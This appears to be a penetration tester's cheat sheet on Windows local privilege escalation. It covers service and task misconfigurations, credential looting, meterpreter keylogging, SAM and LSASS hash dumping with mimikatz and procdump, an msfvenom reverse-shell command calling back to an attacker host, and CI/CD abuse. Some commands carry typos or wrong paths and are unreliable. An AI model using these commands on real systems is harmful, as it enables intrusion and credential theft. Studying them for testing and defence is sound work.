---
title: Windows local privilege-escalation
---

- [1. Automatic tools](#1-automatic-tools)
- [2. Misconfigurations](#2-misconfigurations)
  - [2.1. Scheduled tasks](#21-scheduled-tasks)
  - [2.2. Services](#22-services)
  - [2.3. Modifiable Service File](#23-modifiable-service-file)
  - [2.4. AlwaysInstallElevated](#24-alwaysinstallelevated)
  - [2.5. Users](#25-users)
- [3. Credentials looting](#3-credentials-looting)
  - [3.1. Files](#31-files)
  - [3.2. Shell history](#32-shell-history)
  - [3.3. Credential Manager](#33-credential-manager)
  - [3.4. SSH software](#34-ssh-software)
  - [3.5. Credentials keylogging](#35-credentials-keylogging)
- [4. NT hash extraction](#4-nt-hash-extraction)
  - [4.1. From local SAM](#41-from-local-sam)
  - [4.2. From LSASS memory](#42-from-lsass-memory)
- [5. Bypassing UAC](#5-bypassing-uac)
  - [5.1. Auto-elevation](#51-auto-elevation)
  - [5.2. Scheduled tasks \& environment vars](#52-scheduled-tasks--environment-vars)
- [6. Insecure Features](#6-insecure-features)
  - [6.1. CI/CD software](#61-cicd-software)

## 1. Automatic tools

- [WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)
- [PrivescCheck](https://github.com/itm4n/PrivescCheck)
- [WES-NG](https://github.com/bitsadmin/wesng) - run `systeminfo` and check for misconfiguration offline using `wes.py` script.
- Metasploit: `multi/recon/local_exploit_suggester` (when the shell is already established).

## 2. Misconfigurations

### 2.1. Scheduled tasks
If an attacker is able to modify the `Task To Run` file, he can run a code with `Run As User` privileges.

```powershell
# List all scheduled tasks
schtasks /query /tn <task-name> /fo list /v

# Check file permissions
icacl <path>
```

### 2.2. Services

```bash
# Generate rev-shell service executable
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker-ip> LPORT=<port> -f exe-service -o my-service.exe
```

#### Executable permissions
The executable associated with a service might have insecure permissions. The attacker modifing or replacing the executable can gain the privileges of the service's account.

```powershell
icacls <executable-path>                    # Show DACL of the executable
```

#### Unquoted paths
If the service's executable points to an unquoted path with spaces, SCM tries to execute firt binary which is the first part of the unqoted path. This SCM feature is basically disgusting but it works like that. It  allows an attacker to put malicious service binary in the "wrong" path and run it before a legit one will be executed.

Example:

```text
Path        : C:\MyPrograms\Disk Sorter.exe
Executed 1st: C:\MyPrograms\Disk.exe
Executed 2nd: C:\MyPrograms\Disk Sorter.exe
```

```powershell
# PowerUp module
Get-ServiceUnqoated -Verbose                # List unquoted paths           
```

> **NOTE**: To drop an executable in the root `C:\` directory you need to actually fhave admin privileges so the unquoted `C:\Program Files (x86)\...` is basically useless.

#### Modifiable Service
The service ACL might allow to reconfigure service settings. This allows an attacker to point a malicious executable to the service and even change the account which the executable is run with.

To check a service ACL the [Accesschk](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk) tool might be necessary.

```powershell
accesschk64.exe -qlc <svc-name>             # Check the service ACL

# Reconfigure service: run :exe-path with Local SYSTEM account
sc.exe config <svc-name binPath= "<exe-path" obj= LocalSystem

# PowerUp module
Get-ModifiableService -Verbose              # List modifiable services
```

### 2.3. Modifiable Service File
Sometimes it might be possible to modify binary which is run as a service.

```powershell
# PowerUp module
Get-ModifiableServiceFile -Verbose          # List modifiable service files
```

### 2.4. AlwaysInstallElevated
`.msi` files are used to install applications on the system. They usually run with the privileges of the current user but sometimes it might be configured to run installation files with higher privileges from any user account. Malicious `.msi` files can be generated using `msfvenom` tool.

```powershell
# Check if AlwaysInstallElevated is set
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer

# Execute an .msi file
msiexec /quiet /qn /i <path>
```

### 2.5. Users
Every user has some privileges and some of them might be used to perform privilege escalation:

- [List of all possible privileges](https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants)
- [List of potentially dangerous privileges](https://github.com/gtworek/Priv2Admin)

Check current privileges: `whoami /priv`

#### 2.4.1. SeBackup and SeRestore
The `SeBackup` and `SeRestore` allow a user to read and write to **any file in the system**, ignoring any DACL. They are used to perform full backup of the system without requiring full admin privileges. Using these privileges an attacker is able to export SAM database and extract users hashes offline. More in: `post-exploitation`.

#### 2.4.2. SeTakeOwnership
The `SeTakeOwnership` privilege allows a user to take ownership of any object on the system. An attacker can search for a service running as SYSTEM and take ownership of the service's executable.

```powershell
# The ownership of the file
takeown /f <file>

# Grant full privileges to the file
icacls <file> /grant <username>:F

# Now you can replace this file with an malicious executable
```

#### 2.4.3. SeImpersonate and SeAssignPrimaryToken
These privileges allow a process to act on behalf of another user. It usually consists of being able to spawn a process under the security context of another user.

TBD...

#### 2.4.4. Unpatched software

```powershell
# List the installed software
wmic product get name,version,vendor
```

## 3. Credentials looting

### 3.1. Files

#### 3.1.1. IIS configuration
Configuration files of the IIS web server might store some credentials.

```cmd
C:\inetpub\wwwroot\web.config
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
```

#### 3.1.2. Unattended Windows installations
If the OS is installed remotely (unattended installation) there is a chance that the installation config file is still somwhere in the file system. It might include credentials.

```cmd
C:\Unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
```

### 3.2. Shell history

```powershell
# To read history from cmd.exe
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

```powershell
# To read history from Powershell
type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

### 3.3. Credential Manager
Credential Manager is a feature that stores logon-sensitive information for websites, applications, and networks. It's some kind of an OS-level vault for saved passwords. It contains:

- web credentials
- Windows credentials (e.g. NTLM and Kerberos)

List all vaults. There are two vaults by default (`Web Credentials` and `Windows Credentials`).

```powershell
# List vaults
vaultcmd /list

# List credentials of a given vault
vaultcmd /listproperties:"<VAULT_NAME>"

# List info about credentials
vaultcmd /listcreds:"<VAULT_NAME>"
```

The following command lists all saved credentials for different users:

```powershell
# Show saved credentials and accounts 
cmdkey /list
```

Saved credentials are used by default for a certain user. We can run a command as a different user and use these saved credentials (loaded from cache):

```powershell
# Run a shell as a different user (with its credentials)
runas /savecred /user:<DOMAIN>\<USER> cmd.exe
```

> **NOTE**: Even if the credentials are not shown, you can use the `runas /savecred /user:<user> cmd.exe` command in order to use them from a memory.

### 3.4. SSH software
PuTTY is probably the most common SSH client for Windows in use. It often stores session parameters (e.g. proxy configuration) in the Windows registry.

```powershell
# Show PuTTY configuration
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

### 3.5. Credentials keylogging
If we already have SYSTEM privileges in the OS we can set a keylogger on sessions of another user to steal their credentials.

```powershell
# Check for other users sessions
ps | grep "explorer"
```

Use `meterpreter` session:

```bash
# Migrate to the another user's process
> migrate <PID>

# Check current context
> getuid

# Run keylogger
> keyscan_start

# Wait... and dump logs
> keyscan_dump
```

## 4. NT hash extraction

### 4.1. From local SAM
SAM (Security Account Manager) is a database with all the **local user** accounts and passwords. It acts as a database. Passwords, which are stored in the SAM, are hashed. SAM data is used by LSASS to verify user credentials.

#### 4.1.1. Mimiktaz
Mimikatz is one of the tools that are able to dump SAM file hashes.

```powershell
mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"
```

Metasploit, when the session is already established, has built-in ability to dump SAM hashes.

```bash
# Meterpreter
meterpreter > hashdump
```

CrackMapExec tool is able to remotely dump SAM hashes (via SMB using credentials).

```bash
crackmapexec smb <target-ip> -u <username> -p <password> --sam
```

#### 4.1.2. SAM dumping and offline hashes extraction
If an attacker has privileges to access any file in the system, then he can export SAM and SYSTEM keys from the Windows registry and perform the extraction of hashes offline. Windows registry stores a copy of some of the SAM database contents to be used by services.

```powershell
# Dump SYSTEM hashes
reg save hklm\system <dump-file>

# Dump SAM hashes
reg save hklm\sam <dump-file>
```

Now, transfer files to the attacker machine.

```bash
# Dump hashes offline
impacket-secretsdump -sam <sam-file> -system <system-file> LOCAL 
```

It can be done using `metasploit` framework as well:

```bash
# Dump hashes exploiting LSASS.exe
> hashdump
```

### 4.2. From LSASS memory
LSASS (_Local Security Authority Subsystem Service_) is a process running on every Windows OS. It verifies users logging, handles password changes, creates access tokens, writes to the Windows Security Log. In a domain environment LSASS communicates with a Domain Controller. It manages NTLM, Kerberos, NetLogon authentication. It's not possible to use Windows without `lsass.exe` running. An attacker is able to dump the LSASS process memory and retrieve NT hashes.

Tips:

- Memory dump must be performed after logging in successfully. Correct data must be provided to LSASS process before extraction.
- Memory dump should be performed from SYSTEM or local Administrator account.
- Not secured LSASS memory dump can be performed using built-in Windows tools (e.g. [dump.exe](https://lolbas-project.github.io/lolbas/OtherMSBinaries/Dump64/)). Then credentials can be extracted offline.

LSASS process might have additional security layer called _LSA protection_. It can be omitted with tools like **Mimikatz**.

```powershell
mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::msv" "exit"
```

If there is no LSA, the LSASS memory can be dumped using `Sysinternals Suite` (it's commonly detected):

```powershell
procdump.exe -accepteula -ma lsass.exe <DUMP_FILE>
```

## 5. Bypassing UAC
[UACMe - tool to check different UAC bypass techniques](https://github.com/hfiref0x/UACME).

### 5.1. Auto-elevation
Some executables can auto-elevate to high IL by default, without any user interaction. This applies to most of the Control Panel's functionality and some other built-in executables. To auto-elevate the executable must be signed by the Windows Publisher and must be contained in a trusted directory like `%SystemRoot%/System32` or `%ProgramFiles%/`. Sometimes it must declare `autoElevate` property in the exec manifest file.

### 5.2. Scheduled tasks & environment vars
TBD

## 6. Insecure Features
There is various software that is insecure by design. Legit features of the software allow an attacker to escale privileges, e.g. by executing command as an administrator.

### 6.1. CI/CD software
Most of CI/CD software allows to execute some kind of scripts. Most often they work with escaled privileges (local Administrator or even SYSTEM). After successful login to such a software an attacker is able to execute a malicious code as an administator. Credentials usually are not hard to guess or bruteforce. Jenkins doesn't even have anti-brute-force mechanisms.

> **NOTE**: Sometimes direct script execution is not allowed for you but at the same time you are allowed to add an extra deployment step which executes Windows commands. The result will be the same - command execution.
